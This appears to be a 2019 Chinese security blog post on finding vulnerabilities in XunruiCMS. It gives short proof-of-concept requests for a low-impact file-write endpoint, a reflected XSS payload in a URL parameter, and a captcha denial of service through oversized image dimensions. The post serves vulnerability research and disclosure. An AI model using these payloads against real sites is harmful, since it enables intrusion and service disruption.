---
title: Xunruicms
date: 2019-12-09T00:07:02+08:00
lastmod: 2019-12-09T00:07:02+08:00
categories: ["网络安全"]
description:
---
### 前言
前几天寻思着想挖几个通用的洞 于是在fofa poc列表上找找目标. 锁定目标为`php` `cms` `已有0day`.
![2019-12-09 00-09-38 的屏幕截图.png](https://i.loli.net/2019/12/09/v7qHp1y3ZCaJ6hB.png)
很快就锁定到了这个`迅睿cms`. 发现可以在gitee上下载.

废了好大力气 最后在fofa扫的时候才发现寥寥无几 基本可以忽略. 心态十分爆炸 

### 上传文件
转移了`<>` 危害不大
```
// 漏洞代码
  /**
     * 存储临时表单内容
     */
    public function save_form_data() {
        // fixme 文件写入 但是由于转义了< 所以无法命令
        $rt = \Phpcmf\Service::L('cache')->init('file')->save(
            dr_safe_filename(\Phpcmf\Service::L('input')->get('name')),
            \Phpcmf\Service::L('input')->post('data'),
            7200
        );
        var_dump($rt);
        exit;
    }
```

poc 
```
POST /index.php?c=api&m=save_form_data&s=api&name=test.html 

data: hello world

```

### 反射XSS
需登录 且有权限上传文件

poc `http://127.0.0.1:8080/index.php?c=file&m=input_file_url&s=api&name=1%22%20onfocus=%22alert(%27xss%27);%20autofocus%20%22&fid=1`

### 验证码dos
poc `http://127.0.0.1:8080/index.php?c=api&m=captcha&s=api&width=4000&height=4000`
